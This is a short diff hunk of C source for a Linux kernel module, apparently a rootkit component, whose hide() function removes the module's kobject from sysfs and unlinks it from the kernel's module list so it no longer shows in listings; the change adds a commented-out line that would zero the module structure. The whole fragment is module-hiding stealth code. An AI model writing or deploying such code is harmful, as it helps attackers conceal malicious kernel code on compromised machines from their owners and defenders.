@@ -15,9 +15,11 @@ void hide(void)
 {
 	if (THIS_MODULE->mkobj.kobj.state_initialized)
 		kobject_del(&THIS_MODULE->mkobj.kobj);
-
+		
 	prev_module = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+	// memset(THIS_MODULE, 0, sizeof(struct module));
+
 }
 
 static int __init lkm_hide_init(void)
